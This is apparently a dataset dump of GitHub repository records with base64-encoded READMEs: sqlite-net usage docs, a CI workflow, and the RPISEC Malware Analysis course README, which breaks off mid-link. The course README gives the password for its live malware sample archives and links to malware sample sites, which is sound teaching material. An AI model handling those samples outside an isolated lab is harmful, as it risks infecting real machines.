aXMgbm90IHBoeXNpY2FsbHkgdG91Y2hlZCB1bnRpbCBvbmUgb2YgdGhlIHNw
ZWNpYWwgCnJldHJpZXZhbCBtZXRob2RzIC0gYFRvTGlzdEFzeW5jYCwgYEZp
cnN0QXN5bmNgLCBvciBgRmlyc3RPckRlZmF1bHRBc3luY2AgLSBpcyBjYWxs
ZWQuCgpgYGBjc2hhcnAKdmFyIHF1ZXJ5ID0gZGIuVGFibGU8U3RvY2s+KCku
V2hlcmUocyA9PiBzLlN5bWJvbC5TdGFydHNXaXRoKCJBIikpOwoKdmFyIHJl
c3VsdCA9IGF3YWl0IHF1ZXJ5LlRvTGlzdEFzeW5jKCk7Cgpmb3JlYWNoICh2
YXIgcyBpbiByZXN1bHQpCglDb25zb2xlLldyaXRlTGluZSgiU3RvY2s6ICIg
KyBzLlN5bWJvbCk7CmBgYAoKVGhlcmUgYXJlIGEgbnVtYmVyIG9mIGxvdy1s
ZXZlbCBtZXRob2RzIGF2YWlsYWJsZS4gWW91IGNhbiBhbHNvIHF1ZXJ5IHRo
ZSBkYXRhYmFzZSBkaXJlY3RseSB2aWEgdGhlIGBRdWVyeUFzeW5jYCBtZXRo
b2QuIE92ZXIgYW5kIGFib3ZlIHRoZSBjaGFuZ2UgCm9wZXJhdGlvbnMgcHJv
dmlkZWQgYnkgYEluc2VydEFzeW5jYCBldGMgeW91IGNhbiBpc3N1ZSBgRXhl
Y3V0ZUFzeW5jYCBtZXRob2RzIHRvIGNoYW5nZSBzZXRzIG9mIGRhdGEgZGly
ZWN0bHkgd2l0aGluIHRoZSBkYXRhYmFzZS4KCkFub3RoZXIgaGVscGZ1bCBt
ZXRob2QgaXMgYEV4ZWN1dGVTY2FsYXJBc3luY2AuIFRoaXMgYWxsb3dzIHlv
dSB0byByZXR1cm4gYSBzY2FsYXIgdmFsdWUgZnJvbSB0aGUgZGF0YWJhc2Ug
ZWFzaWx5OgoKYGBgY3NoYXJwCnZhciBjb3VudCA9IGF3YWl0IGRiLkV4ZWN1
dGVTY2FsYXJBc3luYzxpbnQ+KCJzZWxlY3QgY291bnQoKikgZnJvbSBTdG9j
ayIpOwoKQ29uc29sZS5Xcml0ZUxpbmUoc3RyaW5nLkZvcm1hdCgiRm91bmQg
J3swfScgc3RvY2sgaXRlbXMuIiwgY291bnQpKTsKYGBgCgojIyBNYW51YWwg
U1FMCgoqKnNxbGl0ZS1uZXQqKiBpcyBub3JtYWxseSB1c2VkIGFzIGEgbGln
aHQgT1JNIChvYmplY3QtcmVsYXRpb25hbC1tYXBwZXIpIHVzaW5nIHRoZSBt
ZXRob2RzIGBDcmVhdGVUYWJsZWAgYW5kIGBUYWJsZWAuCkhvd2V2ZXIsIHlv
dSBjYW4gYWxzbyB1c2UgaXQgYXMgYSBjb252ZW5pZW50IHdheSB0byBtYW51
YWxseSBleGVjdXRlIHF1ZXJpZXMuCgpIZXJlIGlzIGFuIGV4YW1wbGUgb2Yg
Y3JlYXRpbmcgYSB0YWJsZSwgaW5zZXJ0aW5nIGludG8gaXQgKHdpdGggYSBw
YXJhbWV0ZXJpemVkIGNvbW1hbmQpLCBhbmQgcXVlcnlpbmcgaXQgd2l0aG91
dCB1c2luZyBPUk0gZmVhdHVyZXMuCgpgYGBjc2hhcnAKZGIuRXhlY3V0ZSAo
ImNyZWF0ZSB0YWJsZSBTdG9jayhTeW1ib2wgdmFyY2hhcigxMDApIG5vdCBu
dWxsKSIpOwpkYi5FeGVjdXRlICgiaW5zZXJ0IGludG8gU3RvY2soU3ltYm9s
KSB2YWx1ZXMgKD8pIiwgIk1TRlQiKTsKdmFyIHN0b2NrcyA9IGRiLlF1ZXJ5
PFN0b2NrPiAoInNlbGVjdCAqIGZyb20gU3RvY2siKTsKYGBgCgojIyBVc2lu
ZyBTUUxDaXBoZXIKCllvdSBjYW4gdXNlIGFuIGVuY3J5cHRlZCBkYXRhYmFz
ZSBieSB1c2luZyB0aGUgW3NxbGl0ZS1uZXQtc3FsY2lwaGVyIE51R2V0IHBh
Y2thZ2VdKGh0dHBzOi8vd3d3Lm51Z2V0Lm9yZy9wYWNrYWdlcy9zcWxpdGUt
bmV0LXNxbGNpcGhlcikuCgpUaGUgZGF0YWJhc2Uga2V5IGlzIHNldCBpbiB0
aGUgYFNxbGl0ZUNvbm5lY3Rpb25TdHJpbmdgIHBhc3NlZCB0byB0aGUgY29u
bmVjdGlvbiBjb25zdHJ1Y3RvcjoKCmBgYGNzaGFycAp2YXIgb3B0aW9ucyA9
IG5ldyBTUUxpdGVDb25uZWN0aW9uU3RyaW5nKGRhdGFiYXNlUGF0aCwgdHJ1
ZSwKCWtleTogInBhc3N3b3JkIik7CnZhciBlbmNyeXB0ZWREYiA9IG5ldyBT
UUxpdGVBc3luY0Nvbm5lY3Rpb24ob3B0aW9ucyk7CmBgYAoKSWYgeW91IG5l
ZWQgc2V0IHByYWdtYXMgdG8gY29udHJvbCB0aGUgZW5jcnlwdGlvbiwgYWN0
aW9ucyBjYW4gYmUgcGFzc2VkIHRvIHRoZSBjb25uZWN0aW9uIHN0cmluZzoK
CmBgYGNzaGFycAp2YXIgb3B0aW9uczIgPSBuZXcgU1FMaXRlQ29ubmVjdGlv
blN0cmluZyAoZGF0YWJhc2VQYXRoLCB0cnVlLAoJa2V5OiAicGFzc3dvcmQi
LAoJcHJlS2V5QWN0aW9uOiBkYiA9PiBkYi5FeGVjdXRlKCJQUkFHTUEgY2lw
aGVyX2RlZmF1bHRfdXNlX2htYWMgPSBPRkY7IiksCglwb3N0S2V5QWN0aW9u
OiBkYiA9PiBkYi5FeGVjdXRlICgiUFJBR01BIGtkZl9pdGVyID0gMTI4MDAw
OyIpKTsKdmFyIGVuY3J5cHRlZERiMiA9IG5ldyBTUUxpdGVBc3luY0Nvbm5l
Y3Rpb24gKG9wdGlvbnMyKTsKYGBgCgoKIyMgVGhhbmsgeW91IQoKVGhhbmsg
eW91IHRvIHRoZSAuTkVUIGNvbW11bml0eSBmb3IgZW1icmFjaW5nIHRoaXMg
cHJvamVjdCwgYW5kIHRoYW5rIHlvdSB0byBhbGwgdGhlIGNvbnRyaWJ1dG9y
cyB3aG8gaGF2ZSBoZWxwZWQgdG8gbWFrZSB0aGlzIGdyZWF0LgoKVGhhbmtz
IGFsc28gdG8gVGlyemEgdmFuIERpamsgKEB0aXJ6YXZkaWprKSBmb3IgdGhl
IGdyZWF0IGxvZ28hCgo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"bmFtZTogQnVpbGQKCm9uOiBbcHVzaCwgcHVsbF9yZXF1ZXN0XQoKam9iczoK
ICBidWlsZDoKCiAgICBydW5zLW9uOiBtYWNPUy0xMC4xNAogICAgCiAgICBz
dGVwczoKCiAgICAtIHVzZXM6IGFjdGlvbnMvY2hlY2tvdXRAdjEKICAgIAog
ICAgLSBuYW1lOiBSZXN0b3JlIE51R2V0cwogICAgICBydW46IG51Z2V0IHJl
c3RvcmUgU1FMaXRlLnNsbgoKICAgIC0gbmFtZTogQnVpbGQgYW5kIFRlc3QK
ICAgICAgcnVuOiBtYWtlIHRlc3QKICAgICAgCiAgICAtIG5hbWU6IFBhY2th
Z2UKICAgICAgcnVuOiB8CiAgICAgICAgbWFrZSBudWdldAoKICAgIC0gdXNl
czogYWN0aW9ucy91cGxvYWQtYXJ0aWZhY3RAbWFzdGVyCiAgICAgIHdpdGg6
CiAgICAgICAgbmFtZTogUGFja2FnZXMKICAgICAgICBwYXRoOiBQYWNrYWdl
c091dAoK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'Malware',49282041,b'Course materials for Malware Analysis by RPISEC',,1,2384,,2384,False,b'https://api.github.com/repos/RPISEC/Malware/forks',"IyBNYWx3YXJlIEFuYWx5c2lzIC0gQ1NDSSA0OTc2ClRoaXMgcmVwb3NpdG9y
eSBjb250YWlucyB0aGUgbWF0ZXJpYWxzIGFzIGRldmVsb3BlZCBhbmQgdXNl
ZCBieSBbUlBJU0VDXShodHRwOi8vcnBpcy5lYykgdG8KdGVhY2ggTWFsd2Fy
ZSBBbmFseXNpcyBhdCBbUmVuc3NlbGFlciBQb2x5dGVjaG5pYyBJbnN0aXR1
dGVdKGh0dHA6Ly9ycGkuZWR1KSBpbgpGYWxsIDIwMTUuIFRoaXMgd2FzIGEg
dW5pdmVyc2l0eSBjb3Vyc2UgZGV2ZWxvcGVkIGFuZCBydW4gc29sZXkgYnkg
c3R1ZGVudHMsIHByaW1hcmlseSB1c2luZyB0aGUKW1ByYWN0aWNhbCBNYWx3
YXJlIEFuYWx5c2lzXShodHRwOi8vd3d3LmFtYXpvbi5jb20vUHJhY3RpY2Fs
LU1hbHdhcmUtQW5hbHlzaXMtRGlzc2VjdGluZy1NYWxpY2lvdXMvZHAvMTU5
MzI3MjkwMSkKYm9vayBieSBNaWNoYWVsIFNpa29yc2tpIGFuZCBBbmRyZXcg
SG9uaWcsIHRvIHRlYWNoIHNraWxscyBpbiByZXZlcnNlIGVuZ2luZWVyaW5n
LCBtYWxpY2lvdXMgYmVoYXZpb3VyLCBtYWx3YXJlLAphbmQgYW50aS1hbmFs
eXNpcyB0ZWNobmlxdWVzLgoKPHAgYWxpZ249ImNlbnRlciI+CjxpbWcgd2lk
dGg9IjcwMHB4IiBzcmM9Ii9yZXNvdXJjZXMvaW1hZ2VzL2NsYXNzLnBuZyIg
YWx0PSJNYWx3YXJlIi8+CjwvcD4KCiMjIEFib3V0IHRoZSBDb3Vyc2UKClRo
ZSBQcmFjdGljYWwgTWFsd2FyZSBBbmFseXNpcyAoUE1BKSBib29rIGlzIHdo
ZXJlIG1hbnkgUlBJU0VDIG1lbWJlcnMgYW5kIGFsdW1uIHN0YXJ0ZWQuIFRo
ZSBib29rIHJlYWRzIHZlcnkgd2VsbCwKaXMgZnVsbCBvZiBpbmZvcm1hdGlv
biwgYW5kIHRoZSBsYWIgd2Fsa3Rocm91Z2hzIGluIHRoZSBiYWNrIGFyZSBp
bnZhbHVhYmxlLiBXZSBkaWRuJ3Qgd2FudCB0byByZS1pbnZlbnQgdGhlIHdo
ZWVsIHNvCndlIHN0cnVjdHVyZWQgbW9zdCBvZiB0aGUgY2xhc3MgYXJvdW5k
IHRoZSBib29rLiBTdHVkZW50cyB3ZXJlIGV4cGVjdGVkIHRvIGhhdmUgcmVh
ZCB0aGUgcmVsZXZhbnQgUE1BIGJvb2sgY2hhcHRlcnMKYmVmb3JlIGNsYXNz
LCBhbGxvd2luZyB1cyB0byBzcGVuZCBtdWNoIG1vcmUgY2xhc3MgdGltZSBk
ZW1vbnN0cmF0aW5nIHNraWxscyBhbmQgdGVjaG5pcXVlcyBhbmQgd2Fsa2lu
ZyB0aHJvdWdoCmhhbmRzLW9uIGV4YW1wbGVzIHdpdGggdGhlIHN0dWRlbnRz
LgoKKipTeWxsYWJ1czoqKiBodHRwOi8vc2VjdXJpdHkuY3MucnBpLmVkdS9j
b3Vyc2VzL21hbHdhcmUtZmFsbDIwMTUvU3lsbGFidXMucGRmCgoqKk5vdGU6
IE1vc3Qgb2YgdGhlIHNhbXBsZXMgdXNlZCBpbiB0aGlzIGNvdXJzZSBhcmUg
bWFsaWNpb3VzIGluIG5hdHVyZSwgdHJlYXQgdGhlbSBjYXJlZnVsbHkhKioK
ClRvIGhlbHAgcHJvdGVjdCBwZW9wbGUgZnJvbSBhY2NpZGVudGFseSBydW5u
aW5nIHNhbXBsZXMgb24gYW4gaW1wb3J0YW50IG1hY2hpbmUsIGFuZCB0byBw
cmV2ZW50IGFudGktbWFsd2FyZSBzdWl0ZXMgZnJvbQpibG9ja2luZyB0aGUg
Y291cnNlIG1hdGVyaWFsLCAqKmFsbCBvZiB0aGUgc2FtcGxlcyBhcmUgY29t
cHJlc3NlZCBhbmQgZW5jcnlwdGVkIHdpdGggYSBwYXNzd29yZCBvZiAnaW5m
ZWN0ZWQnLioqCgojIyMgQ291cnNlIEFic3RyYWN0Cgo+X1dpdGggdGhlIGlu
Y3JlYXNlZCB1c2Ugb2YgdGhlIEludGVybmV0IGFuZCBwcmV2YWxlbmNlIG9m
IGNvbXB1dGluZyBzeXN0ZW1zIGluIGNyaXRpY2FsIGluZnJhc3RydWN0dXJl
LCB0ZWNobm9sb2d5IGlzIHVuZG91YnRlZGx5IGEgdml0YWwgcGFydCBvZiBt
b2Rlcm4gZGFpbHkgbGlmZS4gVW5mb3J0dW5hdGVseSwgdGhlIGluY3JlYXNp
bmdseSBuZXR3b3JrZWQgbmF0dXJlIG9mIHRoZSBtb2Rlcm4gd29ybGQgaGFz
IGFsc28gZW5hYmxlZCB0aGUgc3ByZWFkIG9mIG1hbGljaW91cyBzb2Z0d2Fy
ZSwgb3Ig4oCcbWFsd2FyZeKAnSwgcmFuZ2luZyBmcm9tIGFubm95aW5nIGFk
d2FyZSB0byBhZHZhbmNlZCBuYXRpb24tc3RhdGUgc3BvbnNvcmVkIGN5YmVy
LXdlYXBvbnJ5LiBBcyBhIHJlc3VsdCwgdGhlIGFiaWxpdHkgdG8gZGV0ZWN0
LCBhbmFseXplLCB1bmRlcnN0YW5kLCBjb250cm9sLCBhbmQgZXJhZGljYXRl
IG1hbHdhcmUgaXMgYW4gaW5jcmVhc2luZ2x5IGltcG9ydGFudCBpc3N1ZSBv
ZiBlY29ub21pYyBhbmQgbmF0aW9uYWwgc2VjdXJpdHkuXwoKPl9UaGlzIGNv
dXJzZSB3aWxsIGludHJvZHVjZSBzdHVkZW50cyB0byBtb2Rlcm4gbWFsd2Fy
ZSBhbmFseXNpcyB0ZWNobmlxdWVzIHRocm91Z2ggcmVhZGluZ3MgYW5kIGhh
bmRzLW9uIGludGVyYWN0aXZlIGFuYWx5c2lzIG9mIHJlYWwtd29ybGQgc2Ft
cGxlcy4gQWZ0ZXIgdGFraW5nIHRoaXMgY291cnNlIHN0dWRlbnRzIHdpbGwg
YmUgZXF1aXBwZWQgd2l0aCB0aGUgc2tpbGxzIHRvIGFuYWx5emUgYWR2YW5j
ZWQgY29udGVtcG9yYXJ5IG1hbHdhcmUgdXNpbmcgYm90aCBzdGF0aWMgYW5k
IGR5bmFtaWMgYW5hbHlzaXMuXwoKIyMjIFByZXJlcXVpc2l0ZSBLbm93bGVk
Z2UKVGhpcyBjb3Vyc2UgY2FycmllZCBhIHByZXJlcSBvZgpbQ29tcHV0ZXIg
T3JnYW5pemF0aW9uIC0gQ1NDSSAyNTAwXShodHRwOi8vY2F0YWxvZy5ycGku
ZWR1L3ByZXZpZXdfY291cnNlX25vcG9wLnBocD9jYXRvaWQ9MTAmY29pZD0x
NjU3MSkKYXQgUlBJLiBDb21wdXRlciBPcmdhbml6YXRpb24gaXMgUlBJJ3Mg
YmFzaWMgY29tcHV0ZXIgYXJjaGl0ZWN0dXJlIGNvdXJzZSB0aGF0IHRlYWNo
ZXMKdGhpbmdzIGxpa2UgQywgTUlQUyBhc3NlbWJseSwgeDg2IGFzc2VtYmx5
LCBEYXRhcGF0aHMsIENQVSBQaXBlbGluaW5nLCBDUFUgQ2FjaGluZywKTWVt
b3J5IE1hcHBpbmcsIGV0Yy4KCk91ciBleHBlY3RlZCBkZW1vZ3JhcGhpYyBm
b3IgTWFsd2FyZSBBbmFseXNpcyB3YXMgc3R1ZGVudHMgd2l0aCB6ZXJvIHJl
dmVyc2UKZW5naW5lZXJpbmcgZXhwZXJpZW5jZS4gVGhhdCBzYWlkLCB0byBi
ZSBhYmxlIHRvIHRha2UgdGhpcyBjb3Vyc2UKeW91IHdpbGwgcHJvYmFibHkg
bmVlZCBhdCBsZWFzdCB0aGUgZm9sbG93aW5nIHNraWxscy4KKiBXb3JraW5n
IGtub3dsZWRnZSBvZiBDL0MrKwoqIEFueSBhc3NlbWJseSBsZXZlbCBleHBl
cmllbmNlCgojIyMgTGVjdHVyZSBCcmVha2Rvd24KTGVjdHVyZSB8IFRpdGxl
IHwgVG9waWNzCi0tLS0tLS0gfCAtLS0tLSB8IC0tLS0tLQowMSB8IEludHJv
ZHVjdGlvbiB8IFN5bGxhYnVzLCBCYXNpYyBTdGF0aWMgQW5hbHlzaXMsIEJh
c2ljIER5bmFtaWMgQW5hbHlzaXMKMDIgfCBBZHZhbmNlZCBTdGF0aWMgQW5h
bHlzaXMgfCB4ODYsIElEQSwgQ29kZSBDb25zdHJ1Y3RzCjAzIHwgQW5hbHl6
aW5nIFdpbmRvd3MgUHJvZ3JhbXMgfCBXaW5BUEksIEhhbmRsZXMsIFdpbmRv
d3MgSW50ZXJuYWxzLCBOZXR3b3JraW5nLCBDT00KMDQgfCBBZHZhbmNlZCBE
eW5hbWljIEFuYWx5c2lzIHwgRGVidWdnaW5nIENvbmNlcHRzIGFuZCBUb29s
cwowNSB8IE1hbHdhcmUgQmVoYXZpb3IgfCBNYWxpY2lvdXMgQWN0aXZpdGll
cyBhbmQgVGVjaG5pcXVlcwowNiB8IERhdGEgRW5jb2RpbmcgYW5kIE1hbHdh
cmUgQ291bnRlcm1lYXN1cmVzIHwgSGlkaW5nIERhdGEsIE1hbHdhcmUgQ291
bnRlcm1lYXN1cmVzCjA3IHwgQ292ZXJ0IE1hbHdhcmUgTGF1bmNoaW5nIHwg
Q292ZXJ0IExhdW5jaGluZyBhbmQgRXhlY3V0aW9uCjA4IHwgQW50aS1BbmFs
eXNpcyB8IEFudGktRGlzYXNzZW1ibHksIEFudGktVk0sIEFudGktRGVidWdn
aW5nLCBBbnRpLUFWCjA5IHwgUGFja2luZyBhbmQgVW5wYWNraW5nIHwgUGFj
a2VycywgUGFja2luZywgYW5kIFVucGFja2luZwoxMCB8IEludHJvIHRvIFdp
bmRvd3MgS2VybmVsIHwgS2VybmVsIEJhc2ljcywgV2luZG93cyBLZXJuZWwg
QVBJLCBXaW5kb3dzIERyaXZlcnMsIEtlcm5lbCBEZWJ1Z2dpbmcKMTEgfCBS
b290a2l0IFRlY2huaXF1ZXMgfCBIb29raW5nLCBQYXRjaGluZywgRGlyZWN0
IEtlcm5lbCBPYmplY3QgTWFuaXB1bGF0aW9uCjEyIHwgUm9vdGtpdCBBbnRp
LUZvcmVuc2ljcyBhbmQgQ292ZXJ0IENoYW5uZWxzIHwgQW50aS1mb3JlbnNp
Y3MsIENvdmVydCBDaGFubmVscwoKIyMjIExhYiBCcmVha2Rvd24KTGFiIHwg
VG9waWMKLS0tIHwgLS0tLS0KWzAxXSgvTGFicy9MYWJfMDEpIHwgQmFzaWMg
QW5hbHlzaXMKWzAyXSgvTGFicy9MYWJfMDIpIHwgQWR2YW5jZWQgU3RhdGlj
IEFuYWx5c2lzClswM10oL0xhYnMvTGFiXzAzKSB8IEFuYWx5emluZyBXaW5k
b3dzIFByb2dyYW1zClswNF0oL0xhYnMvTGFiXzA0KSB8IEFkdmFuY2VkIER5
bmFtaWMgQW5hbHlzaXMKWzA1XSgvTGFicy9MYWJfMDUpIHwgTWFsd2FyZSBC
ZWhhdmlvcgpbMDZdKC9MYWJzL0xhYl8wNikgfCBEYXRhIEVuY29kaW5nIGFu
ZCBNYWx3YXJlIENvdW50ZXJtZWFzdXJlcwpbMDddKC9MYWJzL0xhYl8wNykg
fCBDb3ZlcnQgTWFsd2FyZSBMYXVuY2hpbmcKWzA4XSgvTGFicy9MYWJfMDgp
IHwgQW50aSBBbmFseXNpcwpbMDldKC9MYWJzL0xhYl8wOSkgfCBQYWNraW5n
IGFuZCBVbnBhY2tpbmcKWzEwXSgvTGFicy9MYWJfMTApIHwgV2luZG93cyBL
ZXJuZWwKCiMjIyBQcm9qZWN0IEJyZWFrZG93bgpQcm9qZWN0IHwgVG9waWMK
LS0tLS0tLSB8IC0tLS0tClswMV0oL1Byb2plY3RzL1Byb2plY3RfMSkgfCBN
YWx3YXJlIEJlaGF2aW9yClswMl0oL1Byb2plY3RzL1Byb2plY3RfMikgfCBS
dW50aW1lIFByb2Nlc3MgTWFuaXB1bGF0aW9uClswM10oL1Byb2plY3RzL1By
b2plY3RfMykgfCBVbnBhY2tpbmcgYW5kIEF1dG9tYXRpb24KWzA0XSgvUHJv
amVjdHMvUHJvamVjdF80KSB8IEFQVCBTYW1wbGUgQW5hbHlzaXMKCkxpbmtz
IGZvciBhZGRpdGlvbmFsIGV4ZXJjaXNlczoKKiBbUHJhY3RpY2FsIE1hbHdh
cmUgQW5hbHlzaXMgTGFic10oaHR0cDovL3ByYWN0aWNhbG1hbHdhcmVhbmFs
eXNpcy5jb20vbGFicy8pCiogW1ByYWN0aWNhbCBSZXZlcnNlIEVuZ2luZWVy
aW5nIExhYnNdKGh0dHBzOi8vZ3JzZWN1cml0eS5uZXQvbWFsd2FyZV9yZXNl
YXJjaC8pCgojIyBBbmFseXNpcyBFbnZpcm9ubWVudAoKU2V0dGluZyB1cCBh
ICJzYWZlIiBhbmQgdXNhYmxlIGFuYWx5c2lzIGVudmlyb25tZW50IGNhbiBy
YW5nZSBmcm9tIGVhc3kgdG8gaW1wb3NzaWJsZSwKZGVwZW5kaW5nIG9uIGhv
dyBmYXIgeW91IHdhbnQgdG8gZ28uIFRoZSBQTUEgYm9vayBkZXZvdGVzIGFu
CmVudGlyZSBjaGFwdGVyIChDaGFwdGVyIDIpIHRvIHRoaXMgcHJvYmxlbS4g
Rm9yIHRoZSBwdXJwb3NlcyBvZiB0aGlzIGNsYXNzLCB3ZQpkZWNpZGVkIHRv
IHNldCB1cCBhIFdpbmRvd3MgNyAzMi1iaXQgdmlydHVhbCBtYWNoaW5lLiBV
bmZvcnR1bmF0ZWx5LCB3aGlsZSBhbGwgdGhlIHNvZnR3YXJlCndlIHVzZWQg
Zm9yIHRoZSBjbGFzcyBpcyBmcmVlLCBXaW5kb3dzIGlzIG5vdCwgdGh1cyB3
ZSBjYW5ub3QgZGlzdHJpYnV0ZSB0aGlzIFZNIGxpa2Ugd2UKZGlzdHJpYnV0
ZWQgdGhlIFdhcnpvbmUgZm9yIE1CRS4gV2UgaGF2ZSwgaG93ZXZlciwgaW5j
bHVkZWQgYSBjb21wcmVoZW5zaXZlIGxpc3QsIGFuZCBhCmNvbGxlY3Rpb24g
b2YgaW5zdGFsbGVycywgb2YgYWxsIHRoZSB0b29scyB3ZSB1c2VkIHRocm91
Z2hvdXQgdGhlIGNvdXJzZS4gVGhlcmUgYXJlIGEgZmV3IAoiZXNzZW50aWFs
cyIgdGhhdCB3ZSBoYXZlbid0IGxpc3RlZCBidXQgYXJlIHN0aWxsIGluY2x1
ZGVkIGluIHRoZSBpbnN0YWxsZXIgcGFja2FnZSAKKHB5dGhvbiwgY3lnd2lu
LCBldGMpLgoKVmlzaXQgdGhlIFtyZWxlYXNlc10oaHR0cHM6Ly9naXRodWIu
Y29tL1JQSVNFQy9NYWx3YXJlL3JlbGVhc2VzKSBwYWdlIGZvciB0aGUgbGF0
ZXN0IHBhY2thZ2UuCgojIyMgVG9vbHMKKiBbRGVwZW5kZW5jeSBXYWxrZXJd
KGh0dHA6Ly93d3cuZGVwZW5kZW5jeXdhbGtlci5jb20vKQoqIFtGYWtlbmV0
XShodHRwOi8vcHJhY3RpY2FsbWFsd2FyZWFuYWx5c2lzLmNvbS9mYWtlbmV0
LykKKiBbRmlsZUFseXplciAyLjBdKGh0dHBzOi8vd3d3LnNhZmVyLW5ldHdv
cmtpbmcub3JnL3Byb2R1Y3RzL2ZpbGVhbHl6ZXIvKQoqIFtIeERdKGh0dHA6
Ly9taC1uZXh1cy5kZS9lbi9oeGQvKQoqIFtJREEgRnJlZV0oaHR0cHM6Ly93
d3cuaGV4LXJheXMuY29tL3Byb2R1Y3RzL2lkYS9zdXBwb3J0L2Rvd25sb2Fk
X2ZyZWV3YXJlLnNodG1sKQoqIFtJbXBSRUNdKGh0dHBzOi8vdHV0czR5b3Uu
Y29tL2Rvd25sb2FkLnBocD92aWV3LjQxNSkKKiBbTG9yZFBFXShodHRwOi8v
d3d3Lndvb2RtYW5uLmNvbS9jb2xsYWJvcmF0aXZlL3Rvb2xzL2luZGV4LnBo
cC9Mb3JkUEUpCiogW01hbGNvZGUgQW5hbHlzdCBQYWNrXShodHRwOi8vc2Fu
ZHNwcml0ZS5jb20vaURlZi9NQVAvKQoqIFtPbGx5RGJnXShodHRwOi8vd3d3
Lm9sbHlkYmcuZGUvKQoqIFtQRWlEXShodHRwczovL3d3dy5hbGRlaWQuY29t
L3dpa2kvUEVpRCkKKiBbUEV2aWV3XShodHRwOi8vd2pyYWRidXJuLmNvbS9z
b2Z0d2FyZS8pCiogW1JlZ3Nob3RdKGh0dHA6Ly9zb3VyY2Vmb3JnZS5uZXQv
cHJvamVjdHMvcmVnc2hvdC8pCiogW1Jlc291cmNlIEhhY2tlcl0oaHR0cDov
L3d3dy5hbmd1c2ouY29tL3Jlc291cmNlaGFja2VyLykKKiBbU3lzaW50ZXJu
YWxzIFN1aXRlXShodHRwczovL3RlY2huZXQubWljcm9zb2Z0LmNvbS9lbi11
cy9zeXNpbnRlcm5hbHMvYmI4NDIwNjIuYXNweCkKKiBbVVBYXShodHRwOi8v
dXB4LnNvdXJjZWZvcmdlLm5ldC8pCiogW1Zpc3VhbCBTdHVkaW9dKGh0dHBz
Oi8vd3d3LnZpc3VhbHN0dWRpby5jb20vZW4tdXMvdmlzdWFsLXN0dWRpby1o
b21lcGFnZS12cy5hc3B4KQoqIFtXaW5kYmddKGh0dHBzOi8vbXNkbi5taWNy
b3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvd2luZG93cy9oYXJkd2FyZS9mZjU1
MTA2Myh2PXZzLjg1KS5hc3B4KQoqIFtXaXJlc2hhcmtdKGh0dHBzOi8vd3d3
LndpcmVzaGFyay5vcmcvKQoKIyMgRnJlcXVlbnRseSBBc2tlZCBRdWVzdGlv
bnMKCklmIHlvdSBhcmUgZXZlciBzdHVjayBvbiBhIHByb2JsZW0gb3IgaGF2
ZSBhbnkgcXVlc3Rpb25zLCB5b3UncmUgbW9yZSB0aGFuIHdlbGNvbWUgdG8K
YXNrIG9uIFtJUkNdKCNjb250YWN0KS4KCiMjIyMgV2hhdCBpcyB0aGUgcGFz
c3dvcmQgdG8gdGhlIHppcCBmaWxlcz8KJ2luZmVjdGVkJywgbm8gcXVvdGVz
LgoKIyMjIyBBcmUgdGhlc2UgZmlsZXMgbWFsaWNpb3VzL2Rhbmdlcm91cz8K
WWVzLiBOb3QgYWxsIG9mIHRoZW0gYXJlIG1hbGljaW91cyBpbiBuYXR1cmUs
IGJ1dCBtb3N0IGFyZS4gQWx3YXlzIGtlZXAgdGhlbSBpbnNpZGUgYQpwcm9w
ZXIgYW5hbHlzaXMgZW52aXJvbm1lbnQuCgojIyMjIFdoeSBhcmUgdGhlIGxl
Y3R1cmUgc2xpZGVzIGZvciBYWVogc28gc3BhcnNlPwpNdWNoIG9mIGxlY3R1
cmUgdGltZSB3YXMgc3BlbnQgaW4gaGFuZHMgb24gZXhhbXBsZXMsIHdpdGgg
dGhlIGV4cGVjdGF0aW9uIHRoYXQgc3R1ZGVudHMKaGFkIHJlYWQgdGhlIG1h
dGVyaWFsIGluIHRoZSBQTUEgYm9vayBhaGVhZCBvZiB0aW1lLiBUaHVzIHRo
ZSBzbGlkZSBjb250ZW50IHJlZmVycmluZwp0byBtYXRlcmlhbCBmcm9tIHRo
ZSBQTUEgYm9vayBpcyBtZWFudCBhcyBtb3JlIG9mIGFuIG91dGxpbmUuIFJl
YWQgdGhlIGNoYXB0ZXJzIGFuZCB0aGVuCmdvIHRocm91Z2ggdGhlIGxhYiB3
YWxrdGhyb3VnaHMgaW4gdGhlIGJhY2sgb2YgdGhlIFBNQSBib29rLCB0aGV5
IGFyZSBhIGdyZWF0IHJlc291cmNlLgoKIyMjIyBEbyB5b3UgaGF2ZSB2aWRl
b3Mgb2YgdGhlIGxlY3R1cmVzPwpTYWRseSB3ZSBkaWQgbm90IHJlY29yZCBh
bnkgb2YgdGhlIGxlY3R1cmVzLCBtYXliZSBuZXh0IHRpbWUuCgojIyMjIFdo
ZXJlIGNhbiBJIGxlYXJuIG1vcmU/ClBsYXkgbW9yZSB3YXJnYW1lczoKKiBb
SU8gV2FyZ2FtZV0oaHR0cHM6Ly9pby5uZXRnYXJhZ2Uub3JnLykKKiBbUHdu
YWJsZSBLUl0oaHR0cDovL3B3bmFibGUua3IvKQoqIFtQd25hYmxlIFRXXSho
dHRwczovL3B3bmFibGUudHcvKQoqIFtPdmVyVGhlV2lyZV0oaHR0cDovL292
ZXJ0aGV3aXJlLm9yZy93YXJnYW1lcy8pCiogW1JldmVyc2luZyBLUl0oaHR0
cDovL3JldmVyc2luZy5rci8pCiogW1czQ2hhbGxzXShodHRwOi8vdzNjaGFs
bHMuY29tLykKKiBbY3JhY2ttZXMuZGVdKGh0dHA6Ly9jcmFja21lcy5kZS8p
CgpSZXZlcnNlIG1vcmUgc2FtcGxlczoKKiBbQ29udGFnaW9dKGh0dHA6Ly9j
b250YWdpb2R1bXAuYmxvZ3Nwb3QuY29tLykKKiBbS2VybmVsbW9kZS5pbmZv
XShodHRwOi8vd3d3Lmtlcm5lbG1vZGUuaW5mby9mb3J1bS8pCiogW01hbHdh
cmUubHVdKGh0dHBzOi8vbWFsd2FyZS5sdS8pCiogW21hbHdyXShodHRwczov
L21hbHdyLmNvbS8pCiogW0h5YnJpZCBBbmFseXNpc10oaHR0cHM6Ly93d3cu
aHlicmlkLWFuYWx5c2lzLmNvbS9yZWNlbnQtc3VibWlzc2lvbnM/ZmlsdGVy
